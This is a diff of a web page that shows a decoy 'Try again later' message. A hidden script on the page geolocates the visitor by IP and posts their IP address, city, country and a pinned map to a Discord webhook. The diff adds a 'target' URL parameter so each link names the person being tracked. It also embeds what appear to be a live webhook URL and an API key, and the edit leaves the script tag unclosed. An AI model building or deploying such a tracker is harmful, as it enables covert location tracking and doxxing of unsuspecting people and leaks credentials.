@@ -11,60 +11,56 @@
     <p>Try again later.</p>
 
     <script>
-        // 1. Paste your URLs and Keys here
-        const webhookUrl = "https://discord.com/api/webhooks/1537770986248601701/0HgBmgK-CmWmqivyfenWvtWMy4hypJTABeFny--_lF6CC4RPRtGr2kTKhnzU-bk0qzX0";
-        const mapApiKey = "61fb851c1d67477c8e614505d1155c19";
+    const webhookUrl = "https://discord.com/api/webhooks/1537770986248601701/0HgBmgK-CmWmqivyfenWvtWMy4hypJTABeFny--_lF6CC4RPRtGr2kTKhnzU-bk0qzX0";
+    const mapApiKey = "61fb851c1d67477c8e614505d1155c19";
 
-        // 2. Fetch the user's location data
-        fetch("https://ipapi.co/json/")
-            .then(response => response.json())
-            .then(data => {
-                
-                // Extract coordinates and location details
-                const lon = data.longitude;
-                const lat = data.latitude;
-                const city = data.city;
-                const country = data.country_name;
+    // 1. Check the URL for a "target" parameter
+    const urlParams = new URLSearchParams(window.location.search);
+    const targetName = urlParams.get('target') || "Unknown Visitor";
 
-                // 3. Build the Static Map Image URL
-                // This URL asks Geoapify for a 600x400 map centered on the coordinates, with a red pin.
-                const mapImageUrl = `https://maps.geoapify.com/v1/staticmap?style=osm-bright&width=600&height=400&center=lonlat:${lon},${lat}&zoom=11&marker=lonlat:${lon},${lat};color:%23ff0000;size:medium&apiKey=${mapApiKey}`;
+    fetch("https://ipapi.co/json/")
+        .then(response => response.json())
+        .then(data => {
+            const lon = data.longitude;
+            const lat = data.latitude;
+            const city = data.city;
+            const country = data.country_name;
 
-                // 4. Create the Discord Embed payload
-                const payload = {
-                    embeds: [
-                        {
-                            title: `🚨 New Visitor in ${city}`,
-                            description: "Someone just visited your website.",
-                            color: 16711680, // This decimal code makes the embed border red
-                            fields: [
-                                {
-                                    name: "Location",
-                                    value: `${city}, ${data.region}, ${country}`,
-                                    inline: true
-                                },
-                                {
-                                    name: "IP Address",
-                                    value: data.ip,
-                                    inline: true
-                                }
-                            ],
-                            image: {
-                                url: mapImageUrl // This tells Discord to display the map image
+            const mapImageUrl = `https://maps.geoapify.com/v1/staticmap?style=osm-bright&width=600&height=400&center=lonlat:${lon},${lat}&zoom=11&marker=lonlat:${lon},${lat};color:%23ff0000;size:medium&apiKey=${mapApiKey}`;
+
+            const payload = {
+                embeds: [
+                    {
+                        // 2. Put the targetName right in the title!
+                        title: `🚨 ${targetName} clicked the link!`,
+                        description: `Visitor located in ${city}.`,
+                        color: 16711680,
+                        fields: [
+                            {
+                                name: "Location",
+                                value: `${city}, ${data.region}, ${country}`,
+                                inline: true
+                            },
+                            {
+                                name: "IP Address",
+                                value: data.ip,
+                                inline: true
                             }
+                        ],
+                        image: {
+                            url: mapImageUrl
                         }
-                    ]
-                };
+                    }
+                ]
+            };
 
-                // 5. Send the embed to Discord
-                return fetch(webhookUrl, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(payload)
-                });
-            })
-            .catch(error => console.error("Error:", error));
-    </script>
+            return fetch(webhookUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+        })
+        .catch(error => console.error("Error:", error))
 
 </body>
 </html>
